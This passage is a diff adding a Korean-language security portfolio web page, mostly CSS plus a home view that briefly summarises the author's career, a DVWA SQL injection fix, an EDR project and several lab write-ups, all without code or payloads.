@@ -1,0 +1,1395 @@
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>성도윤 · 보안 포트폴리오</title>
+<meta name="description" content="성도윤의 보안·시스템 포트폴리오. 클라이언트 개발 경력과 웹·시스템·AI 보안 실습, miniEDR·묘라 프로젝트를 근거와 함께 정리했습니다.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#070708; --surface:#0b0b0d; --surface-2:#0f0f12; --panel:#121215;
+    --line:#242428; --line-2:#323238; --line-faint:#1b1b1f;
+    --white:#ffffff; --fg:#e8e8ea; --muted:#b4b4ba; --dim:#8b8b93; --faint:#4a4a50;
+    --amber:#e0cb92; --good:#9fcf9f;
+    --header-bg:rgba(7,7,8,.9); --footer-bg:#050506;
+    --mono:'JetBrains Mono',ui-monospace,SFMono-Regular,Menlo,monospace;
+    --sans:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+    --wrap:1180px; color-scheme:dark;
+  }
+  /* light theme (browser default when prefers light; toggle overrides) */
+  @media (prefers-color-scheme: light){ :root:not([data-theme="dark"]){
+    --bg:#ffffff; --surface:#f7f7f8; --surface-2:#f1f1f3; --panel:#ebebed;
+    --line:#e3e3e6; --line-2:#d2d2d6; --line-faint:#edeef0;
+    --white:#0b0b0d; --fg:#1c1c1f; --muted:#52525a; --dim:#6c6c74; --faint:#a6a6ad;
+    --amber:#8a6d14; --good:#2a6e31;
+    --header-bg:rgba(255,255,255,.88); --footer-bg:#f3f3f4; color-scheme:light;
+  }}
+  :root[data-theme="light"]{
+    --bg:#ffffff; --surface:#f7f7f8; --surface-2:#f1f1f3; --panel:#ebebed;
+    --line:#e3e3e6; --line-2:#d2d2d6; --line-faint:#edeef0;
+    --white:#0b0b0d; --fg:#1c1c1f; --muted:#52525a; --dim:#6c6c74; --faint:#a6a6ad;
+    --amber:#8a6d14; --good:#2a6e31;
+    --header-bg:rgba(255,255,255,.88); --footer-bg:#f3f3f4; color-scheme:light;
+  }
+  *{box-sizing:border-box}
+  [hidden]{display:none!important}
+  html{scroll-behavior:smooth}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}*{animation:none!important;transition:none!important}}
+  body{margin:0;background:var(--bg);color:var(--fg);font-family:var(--sans);font-size:16px;line-height:1.65;letter-spacing:-0.01em;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+  img{max-width:100%;display:block;height:auto}
+  a{color:inherit;text-decoration:none}
+  h1,h2,h3,h4{margin:0;text-wrap:balance}
+  button{font-family:inherit}
+  ::selection{background:var(--fg);color:var(--bg)}
+  :focus-visible{outline:2px solid var(--white);outline-offset:2px;border-radius:2px}
+  .mono{font-family:var(--mono)} .tnum{font-variant-numeric:tabular-nums}
+  body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);z-index:60;background:var(--bg)}
+  .skip{position:absolute;left:-9999px;top:0;z-index:100;background:var(--fg);color:var(--bg);padding:10px 16px;font-family:var(--mono);font-size:13px;border-radius:0 0 6px 0}
+  .skip:focus{left:0}
+  .wrap{max-width:var(--wrap);margin:0 auto;padding-left:max(20px,env(safe-area-inset-left,0px));padding-right:max(20px,env(safe-area-inset-right,0px))}
+  .band{border-bottom:1px solid var(--line)}
+  section{padding-block:60px;scroll-margin-top:74px}
+  @media(max-width:700px){section{padding-block:42px}}
+
+  /* header */
+  header{position:sticky;top:env(safe-area-inset-top,0px);z-index:50;background:var(--header-bg);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+  .nav{display:flex;align-items:center;gap:12px;min-height:58px;flex-wrap:wrap}
+  .navctrls{display:flex;align-items:center;gap:8px}
+  .themetoggle{display:inline-flex;align-items:center;justify-content:center;width:38px;height:38px;background:var(--surface-2);border:1px solid var(--line-2);color:var(--fg);border-radius:6px;cursor:pointer;font-size:16px;flex:none;line-height:1}
+  .themetoggle:hover,.themetoggle:focus-visible{border-color:var(--white)}
+  .brand{display:flex;align-items:baseline;gap:9px;font-family:var(--mono);font-size:12px;letter-spacing:.04em;padding:8px 0}
+  .brand b{color:var(--white);font-weight:600}
+  .brand span{color:var(--dim);font-size:10.5px;text-transform:uppercase;letter-spacing:.12em}
+  .navmenu{display:flex;align-items:center;gap:4px;margin-left:auto}
+  .navmenu a{font-family:var(--mono);font-size:13px;color:var(--muted);padding:9px 11px;border-radius:5px}
+  .navmenu a:hover,.navmenu a:focus-visible{color:var(--white);background:var(--surface-2)}
+  .navmenu a[aria-current="true"]{color:var(--white)}
+  .navcta{color:var(--fg)!important;border:1px solid var(--line-2);border-radius:5px;padding:8px 14px!important}
+  .navcta:hover{border-color:var(--white)}
+  .navtoggle{display:none;align-items:center;gap:8px;background:var(--surface-2);border:1px solid var(--line-2);color:var(--fg);font-family:var(--mono);font-size:13px;padding:9px 14px;border-radius:7px;cursor:pointer}
+  @media(max-width:880px){
+    .navtoggle{display:inline-flex}
+    .navctrls{margin-left:auto;order:1}
+    .navmenu{order:2;display:none;width:100%;flex-direction:column;align-items:stretch;gap:2px;padding:6px 0 12px;margin-left:0}
+    .nav[data-open="true"] .navmenu{display:flex}
+    .navmenu a{padding:12px;font-size:15px;border-bottom:1px solid var(--line-faint)}
+    .navcta{text-align:center;margin-top:6px}
+  }
+
+  .kicker{font-family:var(--mono);font-size:12px;letter-spacing:.1em;text-transform:uppercase;color:var(--dim)}
+  .ix{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;border-bottom:1px solid var(--line);padding-bottom:13px;margin-bottom:30px;font-family:var(--mono);font-size:12px;color:var(--dim);letter-spacing:.03em}
+  .ix .l{display:flex;align-items:center;gap:11px} .ix b{color:var(--white);font-weight:600} .ix .sl{color:var(--faint)}
+  .shead{display:flex;flex-direction:column;gap:9px;margin-bottom:26px}
+  .shead h2{font-size:clamp(1.5rem,4vw,2rem);font-weight:700;color:var(--white);letter-spacing:-0.02em}
+  .shead p{color:var(--muted);font-weight:300;max-width:54rem;word-break:keep-all}
+  .subhead{font-family:var(--mono);font-size:12px;letter-spacing:.08em;text-transform:uppercase;color:var(--white);display:flex;align-items:center;gap:10px;margin:34px 0 15px}
+  .subhead::after{content:"";flex:1;height:1px;background:var(--line)}
+
+  .chip{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:12px;color:var(--muted);border:1px solid var(--line);border-radius:5px;padding:5px 12px}
+  .chip .dot{width:6px;height:6px;border-radius:50%;background:var(--dim);flex:none}
+  .chip.ok{color:var(--fg)} .chip.ok .dot{background:var(--good)}
+  .chip.pend{color:var(--amber);border-color:#3a3320} .chip.pend .dot{background:var(--amber)}
+  .status{display:flex;flex-wrap:wrap;gap:8px;margin:14px 0 4px}
+  .pills{display:flex;flex-wrap:wrap;gap:7px}
+  .pill{font-family:var(--mono);font-size:11.5px;color:var(--muted);border:1px solid var(--line);border-radius:5px;padding:5px 11px}
+
+  .btn{display:inline-flex;align-items:center;gap:8px;font-family:var(--mono);font-size:13px;padding:11px 19px;border-radius:5px;border:1px solid var(--line-2);color:var(--fg);transition:.2s;cursor:pointer}
+  .btn:hover,.btn:focus-visible{border-color:var(--white);color:var(--white)}
+  .btn.p{background:var(--white);color:var(--bg);border-color:var(--white)} .btn.p:hover{opacity:.88}
+  .btn.sm{padding:8px 15px;font-size:12px}
+
+  /* hero */
+  .hero{display:grid;grid-template-columns:1fr;gap:34px}
+  @media(min-width:900px){.hero{grid-template-columns:1.9fr 1fr;gap:48px;align-items:start}}
+  h1.name{font-size:clamp(2.4rem,7vw,3.6rem);font-weight:700;letter-spacing:-0.03em;color:var(--white);line-height:1.05}
+  .role{font-family:var(--mono);font-size:14px;color:var(--muted);margin-top:12px}
+  .headline{font-size:clamp(1.3rem,3.4vw,1.7rem);font-weight:600;color:var(--fg);line-height:1.35;margin-top:24px;word-break:keep-all;max-width:36rem}
+  .intro{color:var(--muted);font-weight:300;margin-top:18px;max-width:40rem;word-break:keep-all;line-height:1.75}
+  .cta{display:flex;flex-wrap:wrap;gap:11px;margin-top:26px}
+  .method{margin-top:26px;font-family:var(--mono);font-size:12.5px;color:var(--dim)} .method b{color:var(--muted);font-weight:500}
+  .profcard{border:1px solid var(--line);border-radius:10px;background:var(--surface);padding:20px}
+  .profcard img{width:84px;height:104px;object-fit:cover;object-position:top center;border:1px solid var(--line-2);border-radius:6px;filter:grayscale(1) contrast(1.03)}
+  .profcard .top{display:flex;gap:16px;align-items:center;margin-bottom:16px}
+  .profcard .pn b{color:var(--white);font-weight:600;font-size:16px;display:block}
+  .profcard .pn span{font-family:var(--mono);font-size:11px;color:var(--dim);display:block;margin-top:4px}
+  .profcard .pphoto{width:112px;height:140px;object-fit:cover;object-position:top center;border:1px solid var(--line-2);border-radius:8px;filter:grayscale(1) contrast(1.03);margin-bottom:16px}
+  .profcard .qnav{display:flex;flex-direction:column}
+  .profcard .qnav a{font-family:var(--mono);font-size:13px;color:var(--muted);padding:11px 8px;border-top:1px solid var(--line-faint)}
+  .profcard .qnav a:first-child{border-top:none}
+  .profcard .qnav a:hover,.profcard .qnav a:focus-visible{color:var(--white)}
+  .profcard .pskills{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+  .profcard .pskills .pill{font-size:11px;padding:4px 9px}
+  .profcard .pslabel{font-family:var(--mono);font-size:10.5px;letter-spacing:.08em;text-transform:uppercase;color:var(--dim);margin-top:18px}
+  .profcard .ghlink{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:16px;font-family:var(--mono);font-size:13px;color:var(--fg);border:1px solid var(--line-2);border-radius:8px;padding:11px}
+  .profcard .ghlink:hover,.profcard .ghlink:focus-visible{border-color:var(--white);color:var(--white)}
+  .profcard .plinks{display:flex;flex-wrap:wrap;gap:6px 14px;margin-top:16px;padding-top:14px;border-top:1px solid var(--line-faint)}
+  .profcard .plinks a{font-family:var(--mono);font-size:12px;color:var(--muted)}
+  .profcard .plinks a:hover,.profcard .plinks a:focus-visible{color:var(--white)}
+  .kv{display:flex;justify-content:space-between;gap:12px;font-family:var(--mono);font-size:12px;padding:7px 0;border-bottom:1px solid var(--line-faint)}
+  .kv span{color:var(--dim)} .kv b{color:var(--fg);font-weight:500;text-align:right}
+
+  /* index cards (summary / lists) */
+  .cards{display:grid;grid-template-columns:1fr;gap:14px;margin-top:4px;align-items:start}
+  @media(min-width:720px){.cards.two{grid-template-columns:1fr 1fr}}
+  .ic{display:flex;flex-direction:column;border:1px solid var(--line);border-radius:11px;background:var(--surface);overflow:hidden;transition:border-color .2s}
+  .ic:hover{border-color:var(--line-2)}
+  .ic .icimg{aspect-ratio:16/8;background:#000;overflow:hidden;border-bottom:1px solid var(--line)}
+  .ic .icimg img{width:100%;height:100%;object-fit:cover;object-position:top left}
+  .ic .icb{padding:17px 18px;display:flex;flex-direction:column;gap:8px;flex:1}
+  .ic .ictag{font-family:var(--mono);font-size:10.5px;letter-spacing:.06em;color:var(--dim);text-transform:uppercase}
+  .ic h3{font-size:1.1rem;color:var(--white);font-weight:600}
+  .ic p{color:var(--muted);font-size:13.5px;margin:0;line-height:1.55;word-break:keep-all}
+  .ic .icgo{margin-top:auto;font-family:var(--mono);font-size:12px;color:var(--fg);display:inline-flex;align-items:center;gap:6px;padding-top:4px}
+  .ic:hover .icgo{color:var(--white)}
+  .rowlist{border-top:1px solid var(--line)}
+  .rowlist a.row{display:grid;grid-template-columns:auto 1fr auto;gap:16px;align-items:center;padding:17px 4px;border-bottom:1px solid var(--line-faint)}
+  .rowlist a.row:hover{background:var(--surface-2)}
+  .rowlist .rdom{font-family:var(--mono);font-size:11px;color:var(--white);border:1px solid var(--line-2);border-radius:5px;padding:4px 11px;white-space:nowrap}
+  .rowlist .rt b{color:var(--white);font-weight:600;font-size:15px;display:block}
+  .rowlist .rt span{color:var(--muted);font-size:13px;display:block;margin-top:3px;word-break:keep-all}
+  .rowlist .rgo{font-family:var(--mono);font-size:12px;color:var(--dim)}
+  .rowlist a.row:hover .rgo{color:var(--white)}
+  @media(max-width:560px){.rowlist a.row{grid-template-columns:1fr;gap:8px}.rowlist .rgo{display:none}}
+
+  /* crumb / toc (detail views) */
+  .crumb{display:flex;align-items:center;gap:10px;font-family:var(--mono);font-size:12px;color:var(--dim);margin-bottom:22px;flex-wrap:wrap}
+  .crumb a{color:var(--muted)} .crumb a:hover{color:var(--white)} .crumb .sep{color:var(--faint)}
+  .dtitle{font-size:clamp(1.6rem,4.5vw,2.2rem);font-weight:700;color:var(--white);letter-spacing:-0.025em;line-height:1.12}
+  .dsum{color:var(--muted);font-weight:300;margin-top:14px;max-width:56rem;word-break:keep-all;line-height:1.7;font-size:16.5px}
+  .meta{display:grid;grid-template-columns:1fr;gap:0;border:1px solid var(--line);border-radius:10px;margin-top:22px;overflow:hidden}
+  @media(min-width:640px){.meta{grid-template-columns:repeat(4,1fr)}}
+  .meta .m{padding:13px 15px;border-top:1px solid var(--line-faint)}
+  @media(min-width:640px){.meta .m{border-top:none;border-left:1px solid var(--line-faint)}.meta .m:first-child{border-left:none}}
+  .meta .mk{font-family:var(--mono);font-size:10.5px;color:var(--dim);text-transform:uppercase;letter-spacing:.05em}
+  .meta .mv{color:var(--fg);font-size:13.5px;font-weight:500;margin-top:5px}
+  .toc{display:flex;flex-wrap:wrap;gap:7px;margin-top:22px}
+  .toc button{font-family:var(--mono);font-size:12px;color:var(--muted);border:1px solid var(--line);background:var(--surface-2);border-radius:5px;padding:6px 12px;cursor:pointer}
+  .toc button:hover{border-color:var(--line-2);color:var(--white)}
+
+  /* addressable write-up items */
+  .wuplede{color:var(--muted);line-height:1.8;margin-top:4px;word-break:keep-all}
+  .wupnote{font-family:var(--mono);font-size:12px;color:var(--dim);line-height:1.7;margin-top:30px;word-break:keep-all;border-top:1px solid var(--line);padding-top:16px}
+  .wuitem{border-top:1px solid var(--line);padding:22px 0;scroll-margin-top:80px}
+  .wuitem .wuih{display:flex;align-items:baseline;gap:11px;flex-wrap:wrap}
+  .wuitem .wuih .ft{font-family:var(--mono);font-size:10.5px;letter-spacing:.03em;color:var(--amber);border:1px solid var(--line);border-radius:4px;padding:2px 8px;white-space:nowrap}
+  .wuitem .wuih h3{font-size:16.5px;color:var(--white);font-weight:600}
+  .wuitem .wuih .anchor{margin-left:auto;font-family:var(--mono);font-size:11px;color:var(--faint);text-decoration:none}
+  .wuitem .wuih .anchor:hover{color:var(--muted)}
+  .wuitem p{color:var(--muted);line-height:1.85;margin-top:11px;word-break:keep-all;max-width:70ch}
+  .wuitem .st{font-family:var(--mono);font-size:11px;color:var(--dim);margin-top:10px}
+  .wuitem .st b{color:var(--muted);font-weight:600}
+  .wuitem figure.fig{margin-top:14px;max-width:760px}
+
+  .report .rsec{border-top:1px solid var(--line);padding:26px 0;scroll-margin-top:80px}
+  .report .rsec h3{font-family:var(--mono);font-size:12px;letter-spacing:.06em;text-transform:uppercase;color:var(--white);display:flex;gap:9px;align-items:baseline}
+  .report .rsec h3 .n{color:var(--dim)}
+  .report .rsec .rbody{margin-top:14px}
+  .report p{color:var(--muted);line-height:1.72;word-break:keep-all;margin:0 0 10px;max-width:60rem}
+  .report ul{color:var(--muted);line-height:1.72;padding-left:18px;margin:0 0 10px}
+  .report ul li{margin-bottom:5px}
+  .report b{color:var(--fg);font-weight:500}
+  code.inl{font-family:var(--mono);font-size:.85em;background:var(--line-faint);color:var(--fg);padding:1px 5px;border-radius:3px;word-break:break-all}
+
+  figure{margin:0}
+  .fig{border:1px solid var(--line);border-radius:8px;overflow:hidden;background:var(--surface-2)}
+  .fig figcaption{font-family:var(--mono);font-size:12px;color:var(--muted);padding:9px 13px;border-top:1px solid var(--line);word-break:keep-all}
+  .zoom{display:block;width:100%;padding:0;border:0;background:#000;cursor:zoom-in}
+  .zoom img{width:100%;transition:opacity .2s}
+  .zoom:hover img,.zoom:focus-visible img{opacity:.88}
+  .figrow{display:grid;grid-template-columns:1fr;gap:14px;margin-top:14px;align-items:start}
+  @media(min-width:560px){.figrow.two{grid-template-columns:1fr 1fr}}
+  @media(min-width:820px){.figrow.three{grid-template-columns:repeat(3,1fr)}}
+
+  /* terminal/code stays dark in both themes for legibility */
+  .term{border:1px solid #242428;border-radius:8px;background:#0a0a0c;overflow:hidden;font-family:var(--mono);margin-top:4px}
+  .term .bar{display:flex;justify-content:space-between;gap:10px;background:#16161a;border-bottom:1px solid #242428;padding:9px 14px;font-size:12px;color:#8b8b93}
+  .term .bar b{color:#e8e8ea;font-weight:500}
+  .term .body{padding:14px 16px;font-size:12.5px;line-height:1.75;overflow-x:auto}
+  .term .body pre{margin:0;white-space:pre;color:#b4b4ba}
+  .del{color:#8b8b93;text-decoration:line-through;display:block;padding:1px 6px;border-radius:3px;background:rgba(40,40,46,.4)}
+  .add{color:#ffffff;display:block;padding:1px 6px;border-radius:3px;background:rgba(90,90,98,.22)}
+  .cm{color:#55555c}
+
+  .flow{display:grid;gap:8px}
+  .flow .f{display:grid;grid-template-columns:auto 1fr;gap:14px;align-items:baseline;border:1px solid var(--line);border-radius:7px;background:var(--surface-2);padding:11px 14px}
+  .flow .f .n{font-family:var(--mono);font-size:12px;color:var(--dim)}
+  .flow .f .t{font-size:13px;color:var(--muted)} .flow .f .t b{color:var(--fg);font-weight:500}
+  .grid2{display:grid;grid-template-columns:1fr;gap:24px}
+  @media(min-width:900px){.grid2{grid-template-columns:1fr 1fr;align-items:start}}
+  .evtable{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:12.5px;margin-top:4px}
+  .evtable th,.evtable td{border:1px solid var(--line);padding:9px 11px;text-align:left;color:var(--muted)}
+  .evtable th{color:var(--white);font-weight:600;background:var(--surface-2)}
+  .evtable caption{caption-side:bottom;color:var(--dim);font-size:11px;text-align:left;padding-top:8px}
+  .finds{display:grid;grid-template-columns:1fr;gap:14px;margin-top:4px;align-items:start}
+  @media(min-width:560px){.finds{grid-template-columns:1fr 1fr}}
+  @media(min-width:980px){.finds.g3{grid-template-columns:repeat(3,1fr)}}
+  .find{border:1px solid var(--line);border-radius:9px;background:var(--surface);overflow:hidden;display:flex;flex-direction:column}
+  .find .fh{display:flex;gap:8px;align-items:center;padding:12px 15px 0}
+  .find .ft{font-family:var(--mono);font-size:10.5px;color:var(--muted);border:1px solid var(--line);border-radius:4px;padding:2px 7px}
+  .find h4{font-size:14.5px;color:var(--white);font-weight:600;padding:8px 15px 0}
+  .find p{font-size:12.5px;color:var(--muted);margin:5px 0 0;padding:0 15px 14px;line-height:1.55;word-break:keep-all}
+  .find .zoom{order:-1;border-bottom:1px solid var(--line);aspect-ratio:16/9;background:#0a0a0c;display:flex;align-items:center;justify-content:center}
+  .find .zoom img{height:100%;object-fit:contain}
+
+  .job .jobrow{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;font-family:var(--mono);font-size:13px;color:var(--dim);border-bottom:1px solid var(--line);padding-bottom:12px}
+  .job .jobrow b{color:var(--white)}
+  .job h4{font-size:1.15rem;color:var(--white);margin:16px 0 0;font-weight:600}
+  .techtable{border:1px solid var(--line);border-radius:10px;overflow:hidden;margin-top:6px}
+  .techtable .tr{display:grid;grid-template-columns:1fr;gap:4px;padding:15px 18px;border-top:1px solid var(--line-faint)}
+  .techtable .tr:first-child{border-top:none}
+  @media(min-width:760px){.techtable .tr{grid-template-columns:150px 1fr auto;gap:18px;align-items:center}}
+  .techtable .tg{font-family:var(--mono);font-size:12px;color:var(--white);font-weight:600}
+  .techtable .tt{color:var(--muted);font-size:13.5px}
+  .techtable .te a{font-family:var(--mono);font-size:12px;color:var(--fg);border:1px solid var(--line-2);border-radius:5px;padding:5px 12px;white-space:nowrap;display:inline-block}
+  .techtable .te a:hover{border-color:var(--white)}
+  .topics{display:flex;flex-wrap:wrap;gap:8px}
+  .topic{font-family:var(--mono);font-size:12px;color:var(--muted);border:1px solid var(--line);border-radius:5px;padding:6px 11px}
+  .about{display:grid;grid-template-columns:1fr;gap:24px}
+  @media(min-width:760px){.about{grid-template-columns:1fr 1fr}}
+  .ab h4{font-family:var(--mono);font-size:12px;letter-spacing:.08em;text-transform:uppercase;color:var(--white);border-bottom:1px solid var(--line);padding-bottom:9px;margin:0 0 14px}
+  .ab .line{display:flex;justify-content:space-between;gap:14px;font-size:13.5px;padding:7px 0;border-bottom:1px solid var(--line-faint)}
+  .ab .line span{color:var(--dim);font-family:var(--mono);font-size:12px} .ab .line b{color:var(--fg);font-weight:500;text-align:right}
+  .disc{font-family:var(--mono);font-size:12px;color:var(--dim);line-height:1.7;border:1px solid var(--line);border-radius:9px;background:var(--surface-2);padding:15px 17px;margin-top:26px;word-break:keep-all}
+
+  footer{border-top:1px solid var(--line);background:var(--footer-bg);padding-block:28px}
+  .foot{display:flex;flex-wrap:wrap;justify-content:space-between;gap:16px;font-family:var(--mono);font-size:12px;color:var(--dim)}
+  .foot b{color:var(--fg);font-weight:500} .foot .r{display:flex;gap:14px;flex-wrap:wrap} .foot .r a:hover{color:var(--white)}
+
+  .lb{position:fixed;inset:0;z-index:100;background:rgba(3,3,4,.95);display:flex;align-items:center;justify-content:center;padding:max(56px,env(safe-area-inset-top,0px)) 20px max(56px,env(safe-area-inset-bottom,0px))}
+  .lb[hidden]{display:none!important}
+  .lb img{max-width:min(1200px,95vw);max-height:80vh;width:auto;border:1px solid var(--line-2);border-radius:6px}
+  .lb .lb-cap{position:absolute;left:0;right:0;bottom:calc(16px + env(safe-area-inset-bottom,0px));text-align:center;font-family:var(--mono);font-size:12.5px;color:var(--muted);padding:0 20px}
+  .lb .lb-close{position:absolute;top:calc(14px + env(safe-area-inset-top,0px));right:20px;font-family:var(--mono);font-size:13px;color:var(--fg);border:1px solid var(--line-2);border-radius:5px;padding:9px 15px;cursor:pointer;background:var(--surface)}
+  .lb .lb-close:hover{border-color:var(--white)}
+</style>
+</head>
+<body>
+<a class="skip" href="#main">본문 바로가기</a>
+
+<header>
+  <div class="wrap nav" id="nav">
+    <a class="brand" href="#home"><b>성도윤</b><span>Security Portfolio</span></a>
+    <nav class="navmenu" id="navmenu" aria-label="주요 메뉴">
+      <a href="#home" data-nav="home">홈</a>
+      <a href="#about" data-nav="about">소개·경력</a>
+      <a href="#cases" data-nav="cases">진단 리스트</a>
+      <a href="#projects" data-nav="projects">프로젝트 리스트</a>
+      <a href="#writeups" data-nav="writeups">실습·분석</a>
+    </nav>
+    <div class="navctrls">
+      <button class="themetoggle" id="themetoggle" type="button" aria-label="라이트/다크 테마 전환">◐</button>
+      <button class="navtoggle" id="navtoggle" aria-expanded="false" aria-controls="navmenu">메뉴</button>
+    </div>
+  </div>
+</header>
+
+<main id="main">
+
+<!-- ===================== HOME ===================== -->
+<div class="view" id="view-home">
+  <section class="band" aria-labelledby="hero-name">
+    <div class="wrap">
+      <div class="hero">
+        <div>
+          <p class="kicker">보안 포트폴리오</p>
+          <h1 class="name" id="hero-name" tabindex="-1">성도윤</h1>
+          <p class="role">클라이언트 개발 경력 2년</p>
+          <p class="headline"><span style="white-space:nowrap">취약점의 원인을 추적하고,</span> 확인한 증거로 설명합니다.</p>
+          <p class="intro">클라이언트 개발 실무에서 Unity–WebView 통신을 설계하고 기기별 동작 문제를 해결했습니다. 지금은 웹·시스템 보안 실습에서 취약점의 영향을 확인하고 대응 방안을 보고서로 정리합니다.</p>
+        </div>
+        <aside class="profcard" id="contact" aria-label="요약 · 연락">
+          <img class="pphoto" src="assets/img/dev-00.webp" alt="성도윤 프로필 사진" width="112" height="140">
+          <div class="kv"><span>관심 분야</span><b>보안 · 시스템</b></div>
+          <div class="kv"><span>주력 영역</span><b>Web · System · AI</b></div>
+          <div class="kv" style="border-bottom:none"><span>경력</span><b>~2년 클라이언트 개발</b></div>
+          <div class="pslabel">자격증</div>
+          <div class="pskills"><span class="pill">네트워크관리사 2급</span><span class="pill">정보처리기사</span></div>
+          <div class="pslabel">대표 스킬</div>
+          <div class="pskills">
+            <span class="pill">Burp Suite</span><span class="pill">OWASP ZAP</span><span class="pill">Metasploit</span><span class="pill">Volatility</span><span class="pill">OllyDbg</span><span class="pill">C++17 · Win32</span><span class="pill">YARA</span><span class="pill">Python</span>
+          </div>
+          <a class="ghlink" href="https://github.com/TL-cg11" target="_blank" rel="noopener noreferrer">GitHub · TL-cg11 ↗</a>
+        </aside>
+      </div>
+    </div>
+  </section>
+
+  <section class="band">
+    <div class="wrap">
+      <div class="ix"><div class="l"><b>경력</b><span class="sl">/</span><span>BACKGROUND</span></div><a href="#about" style="color:var(--muted)">경력 상세 →</a></div>
+      <div class="job">
+        <div class="jobrow"><span>스윙크 · 클라이언트 개발</span><b>2024.03 — 2026.03</b></div>
+        <p class="intro" style="margin-top:14px;max-width:62rem">Unity·Cocos Creator로 교육용 콘텐츠를 개발하며, Unity–WebView 브릿지 통신 구조와 기기별 동작 문제를 분석·해결했습니다. 상세 기술 스택과 실제 사용 사례(스윙크·miniEDR·묘라)는 경력 상세에 정리했습니다.</p>
+        <div style="margin-top:16px"><a class="btn sm" href="#about">경력 상세 보기 →</a></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="band">
+    <div class="wrap">
+      <div class="ix"><div class="l"><b>진단 리스트</b><span class="sl">/</span><span>CASES</span></div><a href="#cases" style="color:var(--muted)">모든 사례 →</a></div>
+      <div class="cards two">
+        <a class="ic" href="#dvwa">
+          <div class="icimg"><img src="assets/img/dvwa-26.webp" alt="DVWA ZAP 재스캔 화면" loading="lazy"></div>
+          <div class="icb"><span class="ictag">WEB · CWE-89</span><h3>DVWA SQL Injection — 취약 코드 분석과 조치</h3><p>문자열 결합 취약 코드를 바인딩으로 수정하고 ZAP 전후를 대조. 수동 재검증은 보완 예정.</p><span class="icgo">사례 읽기 →</span></div>
+        </a>
+        <a class="ic" href="#wordpress">
+          <div class="icimg"><img src="assets/img/wp-33.webp" alt="WordPress 탐지 화면" loading="lazy"></div>
+          <div class="icb"><span class="ictag">WEB · 연계 실습</span><h3>WordPress 플러그인 취약점 연계 실습</h3><p>사설망 대상 공개 PoC 조정으로 접근·권한 상승·데이터·탐지를 단계별 확인. 신규 발견 아님.</p><span class="icgo">사례 읽기 →</span></div>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <section class="band">
+    <div class="wrap">
+      <div class="ix"><div class="l"><b>프로젝트 리스트</b><span class="sl">/</span><span>PROJECTS</span></div><a href="#projects" style="color:var(--muted)">모든 프로젝트 →</a></div>
+      <div class="cards two">
+        <a class="ic" href="#miniedr">
+          <div class="icimg"><img src="assets/img/edr-arch.webp" alt="miniEDR 구조도" loading="lazy"></div>
+          <div class="icb"><span class="ictag">SYSTEM · C++17</span><h3>miniEDR</h3><p>YARA·SHA256 정적 탐지와 실시간 파일 감시·격리·로그를 직접 구현한 Windows 학습용 EDR.</p><span class="icgo">프로젝트 보기 →</span></div>
+        </a>
+        <a class="ic" href="#myora">
+          <div class="icimg"><img src="assets/img/myora-dash.webp" alt="묘라 보안 대시보드" loading="lazy"></div>
+          <div class="icb"><span class="ictag">WEB · 팀장</span><h3>묘라 — 운세 서비스와 보안 모니터링</h3><p>서비스·인프라·보안 파이프라인을 팀장으로 조율. 개인정보 탐지의 오탐·미탐을 분석해 개선안을 작성.</p><span class="icgo">프로젝트 보기 →</span></div>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <section class="band">
+    <div class="wrap">
+      <div class="ix"><div class="l"><b>실습·분석</b><span class="sl">/</span><span>PRACTICE LOGS</span></div><a href="#writeups" style="color:var(--muted)">전체 글 →</a></div>
+      <div class="rowlist">
+        <a class="row" href="#ssrf"><span class="rdom">WEB</span><span class="rt"><b>SSRF 문자열 필터 우회</b><span>주소 표기 차이로 블랙리스트를 통과한 실습. 관찰 범위는 필터 통과·내부 응답.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#bof"><span class="rdom">SYSTEM · BOF</span><span class="rt"><b>스택과 셸코드를 따라 메모장 실행</b><span>WinExec 셸코드 구성과 실행. DEP·ASLR 우회는 별도 검증.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#malware"><span class="rdom">MALWARE</span><span class="rt"><b>악성코드 정적·동적 분석</b><span>PE·행위·메모리·디스크 포렌식. 화면이 보여주는 범위로 제한.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#writeups"><span class="rdom">ALL</span><span class="rt"><b>웹 진단 실무 · 시스템 침투 실습</b><span>다중 취약점 점검과 사설망 연계 실습을 포함한 전체 목록.</span></span><span class="rgo">목록 →</span></a>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<!-- ===================== ABOUT ===================== -->
+<div class="view" id="view-about" hidden>
+  <section>
+    <div class="wrap">
+      <nav class="crumb" aria-label="위치"><a href="#home">홈</a><span class="sep">/</span><span>소개 · 경력</span></nav>
+      <h1 class="dtitle" tabindex="-1">소개 · 경력</h1>
+      <p class="dsum">클라이언트 개발 실무에서 쌓은 코드 구조 분석·디버깅·협업 경험을 보안 실습의 근거로 연결합니다. 실무의 팀장 보조 역할과 묘라 팀 프로젝트의 팀장 역할은 구분합니다.</p>
+      <div class="toc" role="group" aria-label="목차">
+        <button data-to="swink">스윙크 · 고객사</button><button data-to="tech">핵심 기술</button><button data-to="personal">개인 프로젝트</button><button data-to="certs">자격 · 연락</button>
+      </div>
+      <div class="report job">
+        <div class="rsec" id="swink"><h3><span class="n">01</span> 스윙크 · 클라이언트 개발자</h3><div class="rbody">
